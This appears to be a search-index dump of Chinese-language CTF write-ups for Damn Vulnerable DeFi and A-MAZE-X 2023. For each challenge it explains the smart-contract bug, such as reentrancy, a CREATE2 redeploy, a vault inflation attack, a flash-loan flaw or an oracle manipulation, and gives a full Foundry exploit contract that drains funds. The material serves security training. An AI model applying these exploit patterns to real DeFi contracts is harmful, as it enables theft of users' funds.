official libraries function _getOracleQuote ( uint256 amount ) private view returns ( uint256 ) { ( uint256 reservesWETH , uint256 reservesToken ) = UniswapV2Library . getReserves ( _uniswapFactory , address ( _weth ), address ( _token )); return UniswapV2Library . quote ( amount . mul ( 10 ** 18 ), reservesToken , reservesWETH ); } function quote ( uint amountA , uint reserveA , uint reserveB ) internal pure returns ( uint amountB ) { require ( amountA > 0 , 'UniswapV2Library: INSUFFICIENT_AMOUNT' ); require ( reserveA > 0 && reserveB > 0 , 'UniswapV2Library: INSUFFICIENT_LIQUIDITY' ); amountB = amountA . mul ( reserveB ) / reserveA ; } \u56e0\u4e3a player \u521d\u59cb\u6301\u6709 10000 DVT\uff0c\u53ef\u4ee5\u5148\u4f7f\u7528 DVT \u4ea4\u6362 WETH \u4ee5\u62ac\u9ad8 WETH \u7684\u4ef7\u683c\uff0c\u518d\u8c03\u7528 borrow() \u6e05\u7a7a PuppetV2Pool \u7684\u4ee3\u5e01","title":"9. Puppet V2"},{"location":"wargames/damn_vulnerable_defi/#exploit_6","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function test_puppetV2 () public checkSolvedByPlayer { token . approve ( address ( uniswapV2Router ), PLAYER_INITIAL_TOKEN_BALANCE ); address [] memory path = new address []( 2 ); path [ 0 ] = address ( token ); path [ 1 ] = address ( weth ); uniswapV2Router . swapExactTokensForTokensSupportingFeeOnTransferTokens ( PLAYER_INITIAL_TOKEN_BALANCE , 0 , path , player , block . timestamp + 60 ); weth . deposit { value : PLAYER_INITIAL_ETH_BALANCE }(); uint256 amountToBorrow = lendingPool . calculateDepositOfWETHRequired ( POOL_INITIAL_TOKEN_BALANCE ); weth . approve ( address ( lendingPool ), amountToBorrow ); lendingPool . borrow ( POOL_INITIAL_TOKEN_BALANCE ); token . transfer ( recovery , POOL_INITIAL_TOKEN_BALANCE ); }","title":"Exploit"},{"location":"wargames/defi_security_summit/","tags":["blockchain","smart contract","DeFi","access control","cross-function reentrancy","create2","phantom function","inflation attack"],"text":"#blockchain #smart contract #DeFi #access control #cross-function reentrancy #create2 #phantom function #inflation attack .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } 1. Operation magic redemption \ud83e\ude84\ud83d\udd2e \u00b6 Recover 1000 mETH from the exploiter wallet . Convert the mETH to ETH to avoid further losses. burnFrom() \u4e2d\u5728\u83b7\u53d6 currentAllowance \u65f6\uff0c\u5b9e\u9645\u5f97\u5230\u7684\u662f _allowances[spender][owner] \uff0c\u800c _approve() \u7684\u4f20\u53c2\u987a\u5e8f\u662f\u6b63\u786e\u7684 \u53ef\u901a\u8fc7 burnFrom() \u6765\u53d6\u5f97\u8f6c\u79fb exploiter \u6301\u6709\u4ee3\u5e01\u7684\u6743\u9650 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function burnFrom(address account, uint256 amount) public { - uint256 currentAllowance = allowance(msg.sender, account); + uint256 currentAllowance = allowance(account, msg.sender); require(currentAllowance >= amount, \"ERC20: insufficient allowance\"); // decrease allowance _approve(account, msg.sender, currentAllowance - amount); // burn _burn(account, amount); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 contract Challenge1Test is Test { MagicETH public mETH ; address public exploiter = makeAddr ( \"exploiter\" ); address public whitehat = makeAddr ( \"whitehat\" ); function setUp () public { mETH = new MagicETH (); mETH . deposit { value : 1000 ether }(); // exploiter is in control of 1000 tokens mETH . transfer ( exploiter , 1000 ether ); } function testExploit () public { vm . startPrank ( whitehat , whitehat ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge1Test -vvvv // ////////////////////////////////////////////////////*/ mETH . approve ( exploiter , 1000 ether ); mETH . burnFrom ( exploiter , 0 ); mETH . transferFrom ( exploiter , whitehat , 1000 ether ); mETH . withdraw ( 1000 ether ); //==================================================// vm . stopPrank (); assertEq ( whitehat . balance , 1000 ether , \"whitehat should have 1000 ether\" ); } } 2. Mission Modern WETH: Rescue the Ether \ud83e\uddd7\ud83e\udded \u00b6 Starting with 10 ETH , recover 1000 ETH from the ModernWETH contract. Recover all ETH to avoid further losses from ModernWETH contract. Whitehat hacker should end up with 1010 ETH . \u7531\u4e8e _burnAll() \u57fa\u4e8e msg.sender \u7684\u5f53\u524d\u4f59\u989d\u8fdb\u884c\u4ee3\u5e01\u9500\u6bc1\uff0c\u56e0\u800c\u53ef\u4ee5\u5728\u56de\u8c03\u51fd\u6570\u4e2d\u5c06\u6301\u6709\u7684\u4ee3\u5e01\u8f6c\u79fb\u5230\u53ef\u63a7\u8d26\u6237 \u5229\u7528\u6301\u6709\u7684\u4ee3\u5e01\u53cd\u590d\u8c03\u7528 withdrawAll() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function deposit () public payable { _mint ( msg . sender , msg . value ); } function withdrawAll () external nonReentrant { ( bool success ,) = msg . sender . call { value : balanceOf ( msg . sender )}( \"\" ); require ( success , \"mWETH: ETH transfer failed\" ); _burnAll (); } function _burnAll () internal { _burn ( msg . sender , balanceOf ( msg . sender )); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 /*//////////////////////////////////////////////////////////// // DEFINE ANY NECESSARY CONTRACTS HERE // // If you need a contract for your hack, define it below // ////////////////////////////////////////////////////////////*/ contract Executor { ModernWETH mWETH ; address owner = msg . sender ; constructor ( address _mWETH ) { mWETH = ModernWETH ( _mWETH ); } function execute () external { mWETH . withdrawAll (); } receive () external payable { mWETH . transfer ( owner , mWETH . balanceOf ( address ( this ))); payable ( owner ). transfer ( address ( this ). balance ); } } /*//////////////////////////////////////////////////////////// // TEST CONTRACT // ////////////////////////////////////////////////////////////*/ contract Challenge2Test is Test { ModernWETH public modernWETH ; address public whitehat = makeAddr ( \"whitehat\" ); function setUp () public { modernWETH = new ModernWETH (); /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it address whale = makeAddr ( \"whale\" ); vm . deal ( whale , 1000 ether ); vm . prank ( whale ); modernWETH . deposit { value : 1000 ether }(); /// @dev you, the whitehat, start with 10 ether vm . deal ( whitehat , 10 ether ); } function testWhitehatRescue () public { vm . startPrank ( whitehat , whitehat ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge2Test -vvvv // ////////////////////////////////////////////////////*/ Executor executor = new Executor ( address ( modernWETH )); uint256 amount ; while ( address ( modernWETH ). balance > 0 ) { amount = address ( modernWETH ). balance < whitehat . balance ? address ( modernWETH ). balance : whitehat . balance ; modernWETH . deposit { value : amount }(); modernWETH . transfer ( address ( executor ), amount ); executor . execute (); modernWETH . withdrawAll (); } //==================================================// vm . stopPrank (); assertEq ( address ( modernWETH ). balance , 0 , \"ModernWETH balance should be 0\" ); // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue assertEq ( address ( whitehat ). balance , 1010 ether , \"whitehat should end with 1010 ether\" ); } } 3. LendEx pool hack \ud83e\udd3a\ud83c\udccf \u00b6 You have to fill the shoes of the hacker and execute the exploit by stealing stablecoins from a lending pool. Note Foundry has a bug. If a selfdestruct() is triggered in a test script then it has to be done in the setUp() function and the rest of the code should be in a different function otherwise foundry test script does not see that selfdestruct happened to a contract. hacker \u901a\u8fc7 CreateDeployer \u90e8\u7f72\u4e86 LendingPool \uff0c\u800c CreateDeployer \u7531 Create2Deployer \u90e8\u7f72 1 2 3 4 5 vm . startPrank ( hacker ); create2Deployer = new Create2Deployer (); createDeployer = CreateDeployer ( create2Deployer . deploy ()); lendingPool = LendingPool ( createDeployer . deploy ( true , address ( usdc ))); vm . stopPrank (); CreateDeployer \u4ee5\u53ca LendingPool \u7684 owner \u53ef\u4ee5\u8ba9\u5408\u7ea6\u81ea\u6bc1 CREATE \u6839\u636e sender \u548c nonce \u8ba1\u7b97\u90e8\u7f72\u5408\u7ea6\u7684\u5730\u5740\uff0c CreateDeployer \u81ea\u6bc1\u540e\uff0c nonce \u88ab\u91cd\u7f6e\uff0c\u800c CreateDeployer \u7531 CREATE2 \u521b\u5efa\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728\u540c\u4e00\u5730\u5740\u4e0a\u90e8\u7f72\u4e0d\u540c\u7684\u5408\u7ea6 LendingPool \u6240\u5728\u5730\u5740\u6301\u6709\u7684 USDC \u4e0d\u53d7\u81ea\u6bc1\u7684\u5f71\u54cd Exploit \u00b6 LendingHack.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 contract LendingHack is Ownable { /*////////////////////////////// // Add your hack below! // //////////////////////////////*/ string public constant name = \"LendingPool hack\" ; /** * @dev Constructor that sets the owner of the contract * @param _usdc The address of the USDC contract to use * @param _owner The address of the owner of the contract */ constructor ( address _owner , address _usdc ) { USDC usdc = USDC ( _usdc ); usdc . transfer ( _owner , usdc . balanceOf ( address ( this ))); } //============================// } Challenge3.t.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 contract Challenge3Test is Test { USDC public usdc ; uint256 public usdcAmount = 100000 ; LendExGovernor public lendExGovernor ; CreateDeployer public createDeployer ; Create2Deployer public create2Deployer ; LendingPool public lendingPool ; LendingHack public lendingHack ; address public hacker = makeAddr ( \"hacker\" ); address public governanceOwner = makeAddr ( \"governanceOwner\" ); function setUp () public { /* set up actions */ usdc = new USDC ( usdcAmount ); usdc . transfer ( governanceOwner , usdcAmount ); /* sending transactions as hacker */ // deploying the LendingPool contract vm . startPrank ( hacker ); create2Deployer = new Create2Deployer (); createDeployer = CreateDeployer ( create2Deployer . deploy ()); lendingPool = LendingPool ( createDeployer . deploy ( true , address ( usdc ))); vm . stopPrank (); /* sending transactions as the governance owner */ // deploying the LendingPool contract vm . startPrank ( governanceOwner ); lendExGovernor = new LendExGovernor ( address ( usdc )); lendExGovernor . addContract ( address ( lendingPool )); usdc . transfer ( address ( lendExGovernor ), usdcAmount ); // funding the LendingPool contract with USDC lendExGovernor . fundLendingPool ( address ( lendingPool ), usdcAmount ); vm . stopPrank (); assertEq ( lendExGovernor . getPoolName ( address ( lendingPool )), \"LendingPool V1\" , \"lendingPool contract has the original name\" ); vm . startPrank ( hacker ); /*////////////////////////////////////////////////////////////////////// // Add your hack below! // // Hack part #1 // // NOTE!!! Foundry has a bug // // anything selfdestruct() related has to be in the setUp() function // // // // terminal command to run the speciffic test: // // forge test --match-contract Challenge3Test -vvvv // //////////////////////////////////////////////////////////////////////*/ lendingPool . emergencyStop (); createDeployer . cleanUp (); //====================================================================// vm . stopPrank (); } function testExploit () public { vm . startPrank ( hacker ); /*////////////////////////////////////////////////////////////// // Add your hack below! // // Hack part #2 // // Please implement necessary changes also to LendingHack.sol // // terminal command to run the specific test: // // forge test --match-contract Challenge3Test -vvvv // //////////////////////////////////////////////////////////////*/ createDeployer = CreateDeployer ( create2Deployer . deploy ()); lendingHack = LendingHack ( createDeployer . deploy ( false , address ( usdc ))); //=============================================================// vm . stopPrank (); assertEq ( lendExGovernor . getPoolName ( address ( lendingPool )), \"LendingPool hack\" , \"lendingPool contract address now gives a different name\" ); assertEq ( usdc . balanceOf ( hacker ), usdcAmount , \"Hacker has to steal all the stablecoin tokens\" ); } } References \u00b6 Deploy Different Contracts at the Same Address | Solidity by Example 4. Operation Rescue POSI Token \ud83d\udcbc\ud83d\udd13 \u00b6 Extract the 1000 POSI tokens from the Vault. Transfer the rescued tokens to the address of the organization. VaultFactory \u4f7f\u7528 CREATE2 \u90e8\u7f72\u5408\u7ea6\uff0c\u6839\u636e\u90e8\u7f72\u5b57\u8282\u7801\u548c\u76d0\u503c\u53ef\u4ee5\u786e\u5b9a\u5408\u7ea6\u90e8\u7f72\u7684\u5730\u5740 The only thing that we know is that he used to work with us in the past, that his birthday was in November and that he was a big fan of the CREATE2 opcode. \u6839\u636e\u63d0\u793a\u53ef\u4ee5\u786e\u5b9a salt \u4e3a 11 Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 contract Challenge4Test is Test { VaultFactory public FACTORY ; PosiCoin public POSI ; address public unclaimedAddress = 0x70E194050d9c9c949b3061CC7cF89dF9c6782b7F ; address public whitehat = makeAddr ( \"whitehat\" ); address public devs = makeAddr ( \"devs\" ); function setUp () public { vm . label ( unclaimedAddress , \"Unclaimed Address\" ); // Instantiate the Factory FACTORY = new VaultFactory (); // Instantiate the POSICoin POSI = new PosiCoin (); // OOPS transferred to the wrong address! POSI . transfer ( unclaimedAddress , 1000 ether ); } function testWhitehatRescue () public { vm . deal ( whitehat , 10 ether ); vm . startPrank ( whitehat , whitehat ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge4Test -vvvv // ////////////////////////////////////////////////////*/ VaultWalletTemplate wallet = VaultWalletTemplate ( payable ( FACTORY . deploy ( type ( VaultWalletTemplate ). creationCode , 11 ))); wallet . initialize ( whitehat ); wallet . withdrawERC20 ( address ( POSI ), 1000 ether , devs ); //==================================================// vm . stopPrank (); assertEq ( POSI . balanceOf ( devs ), 1000 ether , \"devs' POSI balance should be 1000 POSI\" ); } } 5. Balloon Vault \ud83c\udf88\ud83c\udf88 \u00b6 Drain Bob's wallet and Alice's wallet End up with more than 1000 ETH in your wallet BallonVault \u6709\u8f6c\u79fb Bob \u548c Alice \u6301\u6709 WETH \u7684\u8bb8\u53ef 1 2 3 4 vm . prank ( bob ); weth . approve ( address ( vault ), 500 ether ); vm . prank ( alice ); weth . approve ( address ( vault ), 500 ether ); WETH \u6ca1\u6709\u51fd\u6570 permit() \uff0c\u56e0\u6b64\u8c03\u7528 depositWithPermit() \u4e0d\u4f1a\u5bf9\u7b7e\u540d\u8fdb\u884c\u6821\u9a8c 1 2 3 4 5 6 7 function depositWithPermit ( address from , uint256 amount , uint256 deadline , uint8 v , bytes32 r , bytes32 s ) external { IERC20Permit ( address ( asset ())). permit ( from , address ( this ), amount , deadline , v , r , s ); _deposit ( from , from , amount , previewDeposit ( amount )); } attacker \u6ca1\u6709\u8f6c\u79fb Bob \u6216 Alice \u6301\u6709 Shares \u7684\u8bb8\u53ef\uff0c\u901a\u8fc7\u901a\u8d27\u81a8\u80c0\u653b\u51fb\uff0c\u4f7f Bob \u6216 Alice \u7684 deposit \u65e0\u6cd5\u83b7\u5f97 Shares\uff0c\u4ece\u800c\u5728 redeem \u65f6\u83b7\u5f97\u66f4\u591a\u7684 WETH Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 contract Challenge5Test is Test { BallonVault public vault ; WETH public weth = new WETH (); address public attacker = makeAddr ( \"attacker\" ); address public bob = makeAddr ( \"bob\" ); address public alice = makeAddr ( \"alice\" ); function setUp () public { vault = new BallonVault ( address ( weth )); // Attacker starts with 10 ether vm . deal ( address ( attacker ), 10 ether ); // Set up Bob and Alice with 500 WETH each weth . deposit { value : 1000 ether }(); weth . transfer ( bob , 500 ether ); weth . transfer ( alice , 500 ether ); vm . prank ( bob ); weth . approve ( address ( vault ), 500 ether ); vm . prank ( alice ); weth . approve ( address ( vault ), 500 ether ); } function _inflation_attack ( address victim ) internal { vault . deposit ( 1 , attacker ); weth . transfer ( address ( vault ), weth . balanceOf ( attacker )); uint256 amount = weth . balanceOf ( address ( vault )) - 1 ; vault . depositWithPermit ( victim , amount > weth . balanceOf ( victim ) ? weth . balanceOf ( victim ) : amount , 0 , 0 , bytes32 ( 0 ), bytes32 ( 0 ) ); vault . redeem ( 1 , attacker , attacker ); } function testExploit () public { vm . startPrank ( attacker ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge5Test -vvvv // ////////////////////////////////////////////////////*/ weth . deposit { value : 10 ether }(); weth . approve ( address ( vault ), type ( uint256 ). max ); while ( weth . balanceOf ( alice ) > 0 ) { _inflation_attack ( alice ); } _inflation_attack ( bob ); // the attacker now has enough weth to steal from Bob in a single step //==================================================// vm . stopPrank (); assertGt ( weth . balanceOf ( address ( attacker )), 1000 ether , \"Attacker should have more than 1000 ether\" ); } } 6. Safe Yield? \ud83c\udfe6\ud83d\udcc8 \u00b6 Drain at least 100 ETH from the yield pool. flashLoan() \u5728\u5b8c\u6210 onFlashLoan() \u7684\u8c03\u7528\u540e\u53ea\u68c0\u67e5\u5408\u7ea6\u4e2d\u5bf9\u5e94\u8d44\u4ea7\u7684\u4f59\u989d\uff0c\u53ef\u5728\u56de\u8c03\u51fd\u6570\u4e2d\u901a\u8fc7 addLiquidity() \u3001 ethToToken() \u6216 tokenToEth() \u8fdb\u884c\u8f6c\u6362 1 2 3 4 5 6 if ( token == ETH ) { require ( address ( this ). balance >= expected , \"Flash loan not repayed\" ); } else { require ( getReserve () >= expected , \"Flash loan not repayed\" ); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 contract Hack is IERC3156FlashBorrower { YieldPool pool ; SecureumToken token ; address payable owner = payable ( msg . sender ); constructor ( YieldPool _pool , SecureumToken _token ) payable { pool = _pool ; token = _token ; } function exploit () external { token . approve ( address ( pool ), type ( uint256 ). max ); while ( address ( this ). balance < 100 ether ) { if ( address ( this ). balance > 0 ) { pool . flashLoan ( IERC3156FlashBorrower ( address ( this )), pool . ETH (), address ( this ). balance * 100 , \"\" ); } else { pool . flashLoan ( IERC3156FlashBorrower ( address ( this )), address ( token ), token . balanceOf ( address ( this )) * 100 , \"\" ); } } } function withdraw () external { require ( msg . sender == owner ); pool . tokenToEth ( token . balanceOf ( address ( this ))); owner . transfer ( address ( this ). balance ); } function onFlashLoan ( address , address _token , uint256 amount , uint256 , bytes calldata ) external returns ( bytes32 ) { require ( msg . sender == address ( pool )); if ( _token == address ( token )) { pool . tokenToEth ( token . balanceOf ( address ( this ))); } else { pool . ethToToken { value : address ( this ). balance }(); } return keccak256 ( \"ERC3156FlashBorrower.onFlashLoan\" ); } receive () external payable {} } /*//////////////////////////////////////////////////////////// // TEST CONTRACT // ////////////////////////////////////////////////////////////*/ contract Challenge6Test is Test { SecureumToken public token ; YieldPool public yieldPool ; address public attacker = makeAddr ( \"attacker\" ); address public owner = makeAddr ( \"owner\" ); function setUp () public { // setup pool with 10_000 ETH and ST tokens uint256 start_liq = 10 _000 ether ; vm . deal ( address ( owner ), start_liq ); vm . prank ( owner ); token = new SecureumToken ( start_liq ); yieldPool = new YieldPool ( token ); vm . prank ( owner ); token . increaseAllowance ( address ( yieldPool ), start_liq ); vm . prank ( owner ); yieldPool . addLiquidity { value : start_liq }( start_liq ); // attacker starts with 0.1 ether vm . deal ( address ( attacker ), 0.1 ether ); } function testExploitPool () public { vm . startPrank ( attacker ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge6Test -vvvv // ////////////////////////////////////////////////////*/ Hack hack = new Hack { value : 0.1 ether }( yieldPool , token ); hack . exploit (); hack . withdraw (); //==================================================// vm . stopPrank (); assertGt ( address ( attacker ). balance , 100 ether , \"hacker should have more than 100 ether\" ); } } 7. Crystal DAO \ud83d\udc8e\ud83d\udc8e \u00b6 Rescue 100 ETH from the DAO treasury. DaoVaultImplementation \u7ee7\u627f\u4e86 Initializable \u548c EIP712Upgradeable \uff0c\u56e0\u6b64 slot 0 \u4e0d\u5bf9\u5e94\u72b6\u6001\u53d8\u91cf owner \uff0c\u5728\u8c03\u7528 initialize() \u540e owner \u4ecd\u4e3a\u9ed8\u8ba4\u503c address(0) 1 2 3 4 5 6 7 8 9 function initialize ( address _owner ) public initializer { // EIP712 init: name DaoWallet, version 1.0 __EIP712_init ( \"DaoWallet\" , \"1.0\" ); // postInit: set owner with gas optimizations assembly { sstore ( 0 , _owner ) } } \u7531\u4e8e\u672a\u8fdb\u884c\u96f6\u5730\u5740\u68c0\u67e5\uff0c\u65e0\u6548\u7b7e\u540d\u53ef\u901a\u8fc7\u6821\u9a8c 1 2 address signer = ecrecover ( hash , v , r , s ); require ( owner == signer , \"Only owner can execute!\" ); Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 contract Challenge7Test is Test { FactoryDao factory ; address public whitehat = makeAddr ( \"whitehat\" ); address public daoManager ; uint256 daoManagerKey ; IDaoVault vault ; function setUp () public { ( daoManager , daoManagerKey ) = makeAddrAndKey ( \"daoManager\" ); factory = new FactoryDao (); vm . prank ( daoManager ); vault = IDaoVault ( factory . newWallet ()); // The vault has reached 100 ether in donations deal ( address ( vault ), 100 ether ); } function testHack () public { vm . startPrank ( whitehat , whitehat ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge7Test -vvvv // ////////////////////////////////////////////////////*/ vault . execWithSignature ( 0 , bytes32 ( 0 ), bytes32 ( 0 ), daoManager , 100 ether , \"\" , block . timestamp + 1 ); //==================================================// vm . stopPrank (); assertEq ( daoManager . balance , 100 ether , \"The Dao manager's balance should be 100 ether\" ); } } 8. Liquidatoooor \ud83d\udd31\ud83d\udd31 \u00b6 Drop the borrower's health account. Liquidate the borrower and get as much of his collateral as possible. token0 (TKN) \u7684\u4ef7\u683c\u80fd\u591f\u5f71\u54cd\u5065\u5eb7\u7cfb\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function healthFactor ( address _user ) public returns ( uint256 ) { if ( users [ _user ]. borrow == 0 ) { // User has not borrowed any tokens, so health is theoretically infinite return type ( uint256 ). max ; } uint256 collateralValue = users [ _user ]. collateral * getPriceToken (); uint256 borrowValue = users [ _user ]. borrow ; uint256 hf = collateralValue * CF / borrowValue ; // Includes 2 decimals return hf ; } function getPriceToken () public returns ( uint256 ) { return amm . getPriceToken0 (); } \u7531\u4e8e\u4f7f\u7528\u7684\u662f\u5b9e\u65f6\u4ef7\u683c\uff0c\u901a\u8fc7 swap() \u964d\u4f4e token0 \u7684\u4ef7\u683c\uff0c\u4ee5\u964d\u4f4e\u5065\u5eb7\u7cfb\u6570\u5e76\u6e05\u7b97\u539f\u5148\u5065\u5eb7\u7684\u8d26\u6237 1 2 3 function getPriceToken0 () public view returns ( uint256 ) { return ( reserve1 * 1e18 ) / reserve0 ; } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 contract Challenge8Test is Test { Oiler public oiler ; AMM public amm ; ERC20 token ; ERC20 dai ; address player ; address superman ; function setUp () public { /** * @notice Create ERC20 tokens */ token = new ERC20 ( \"Token\" , \"TKN\" ); dai = new ERC20 ( \"DAI token\" , \"DAI\" ); vm . label ( address ( token ), \"TKN\" ); vm . label ( address ( dai ), \"DAI\" ); /** * @notice Deploy contant prodcut AMM with a TOKEN <> DAI pair */ amm = new AMM ( address ( token ), address ( dai )); vm . label ( address ( amm ), \"amm\" ); /** * @notice Deploy Lending contract. Accepts 'TOKEN' as collateral and * mints a 'dTOKEN' underlying debt token. */ oiler = new Oiler ( address ( token ), address ( amm )); vm . label ( address ( oiler ), \"oiler\" ); /** * @notice Create 2 accounts and fund them. * - Player starts with 100 TOKEN and 100 DAI * - Superman starts with 200 TOKEN and 200 DAI, * Superman adds 100 of each to the pool. */ player = makeAddr ( \"player\" ); superman = makeAddr ( \"Super-man\" ); deal ( address ( token ), player , 100 ); deal ( address ( dai ), player , 100 ); deal ( address ( token ), superman , 200 ); deal ( address ( dai ), superman , 200 ); /** * @notice Add liquidity to AMM pair. */ vm . startPrank ( superman ); token . approve ( address ( amm ), type ( uint256 ). max ); dai . approve ( address ( amm ), type ( uint256 ). max ); amm . addLiquidity ( 100 , 100 ); vm . stopPrank (); } function testSolution () public { // Victim set up vm . startPrank ( superman ); token . approve ( address ( oiler ), 100 ); oiler . deposit ( 100 ); oiler . maxBorrow ( superman ); // Always account for 2 Decimal places oiler . borrow ( 75 ); oiler . healthFactor ( superman ); vm . stopPrank (); // Player initial balance is of 100 $TOKEN and 100 $DAI console . log ( \"Initial token balance: \" , token . balanceOf ( player )); console . log ( \"Initial dai balance: \" , dai . balanceOf ( player )); vm . startPrank ( player ); /*//////////////////////////////////////////////////// // Add your attack logic below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge8Test -vvvv // ////////////////////////////////////////////////////*/ token . approve ( address ( oiler ), 4 ); oiler . deposit ( 4 ); oiler . borrow ( 3 ); // for repayment token . approve ( address ( amm ), 96 ); amm . swap ( address ( token ), 96 ); oiler . liquidate ( superman ); dai . approve ( address ( amm ), dai . balanceOf ( player )); amm . swap ( address ( dai ), dai . balanceOf ( player )); //==================================================// vm . stopPrank (); // Conditions to pass: // - Player has liquidated the victim // - Player has more than 150 $TOKENs // - Extra: Player has more than 200 $TOKENs Oiler . User memory victim = oiler . getUserData ( superman ); assertEq ( victim . liquidated , true ); assert ( token . balanceOf ( player ) > 200 ); } }","title":"A-MAZE-X CTF 2023"},{"location":"wargames/defi_security_summit/#1-operation-magic-redemption","text":"Recover 1000 mETH from the exploiter wallet . Convert the mETH to ETH to avoid further losses. burnFrom() \u4e2d\u5728\u83b7\u53d6 currentAllowance \u65f6\uff0c\u5b9e\u9645\u5f97\u5230\u7684\u662f _allowances[spender][owner] \uff0c\u800c _approve() \u7684\u4f20\u53c2\u987a\u5e8f\u662f\u6b63\u786e\u7684 \u53ef\u901a\u8fc7 burnFrom() \u6765\u53d6\u5f97\u8f6c\u79fb exploiter \u6301\u6709\u4ee3\u5e01\u7684\u6743\u9650 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function burnFrom(address account, uint256 amount) public { - uint256 currentAllowance = allowance(msg.sender, account); + uint256 currentAllowance = allowance(account, msg.sender); require(currentAllowance >= amount, \"ERC20: insufficient allowance\"); // decrease allowance _approve(account, msg.sender, currentAllowance - amount); // burn _burn(account, amount); }","title":"1. Operation magic redemption \ud83e\ude84\ud83d\udd2e"},{"location":"wargames/defi_security_summit/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 contract Challenge1Test is Test { MagicETH public mETH ; address public exploiter = makeAddr ( \"exploiter\" ); address public whitehat = makeAddr ( \"whitehat\" ); function setUp () public { mETH = new MagicETH (); mETH . deposit { value : 1000 ether }(); // exploiter is in control of 1000 tokens mETH . transfer ( exploiter , 1000 ether ); } function testExploit () public { vm . startPrank ( whitehat , whitehat ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge1Test -vvvv // ////////////////////////////////////////////////////*/ mETH . approve ( exploiter , 1000 ether ); mETH . burnFrom ( exploiter , 0 ); mETH . transferFrom ( exploiter , whitehat , 1000 ether ); mETH . withdraw ( 1000 ether ); //==================================================// vm . stopPrank (); assertEq ( whitehat . balance , 1000 ether , \"whitehat should have 1000 ether\" ); } }","title":"Exploit"},{"location":"wargames/defi_security_summit/#2-mission-modern-weth-rescue-the-ether","text":"Starting with 10 ETH , recover 1000 ETH from the ModernWETH contract. Recover all ETH to avoid further losses from ModernWETH contract. Whitehat hacker should end up with 1010 ETH . \u7531\u4e8e _burnAll() \u57fa\u4e8e msg.sender \u7684\u5f53\u524d\u4f59\u989d\u8fdb\u884c\u4ee3\u5e01\u9500\u6bc1\uff0c\u56e0\u800c\u53ef\u4ee5\u5728\u56de\u8c03\u51fd\u6570\u4e2d\u5c06\u6301\u6709\u7684\u4ee3\u5e01\u8f6c\u79fb\u5230\u53ef\u63a7\u8d26\u6237 \u5229\u7528\u6301\u6709\u7684\u4ee3\u5e01\u53cd\u590d\u8c03\u7528 withdrawAll() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function deposit () public payable { _mint ( msg . sender , msg . value ); } function withdrawAll () external nonReentrant { ( bool success ,) = msg . sender . call { value : balanceOf ( msg . sender )}( \"\" ); require ( success , \"mWETH: ETH transfer failed\" ); _burnAll (); } function _burnAll () internal { _burn ( msg . sender , balanceOf ( msg . sender )); }","title":"2. Mission Modern WETH: 